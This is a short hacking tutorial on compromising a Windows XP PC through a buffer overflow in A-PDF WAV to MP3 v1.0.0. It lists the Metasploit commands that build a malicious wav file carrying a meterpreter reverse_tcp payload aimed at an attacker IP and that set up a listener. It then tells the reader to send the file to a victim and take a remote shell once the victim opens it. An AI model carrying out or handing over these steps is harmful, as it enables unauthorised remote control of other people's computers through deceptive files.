Hack Remote Windows PC Using A-PDF WAV to MP3 v1.0.0 Buffer Overflow

This module exploits a buffer overflow in A-PDF WAV to MP3 v1.0.0. When the application is used to import a specially crafted m3u file, a buffer overflow occurs allowing arbitrary code execution
A-PDF WAV to MP3 v1.0.0
Attacker: Backtrack 5
Victim PC: Windows XP
Open Kali Linux terminal type msfconsole

Now type use exploit/windows/fileformat/a-pdf_wav_to_mp3
msf exploit (a-pdf_wav_to_mp3)>set payload windows/meterpreter/reverse_tcp 
msf exploit (a-pdf_wav_to_mp3)>set lhost 192.168.0.105 (IP of Local Host)
msf exploit (a-pdf_wav_to_mp3)>exploit

After we successfully generate the malicious wav File, it will stored on your local computer
/root/.msf4/local/msf.wav

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.105
exploit
Now send your msf.wav files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
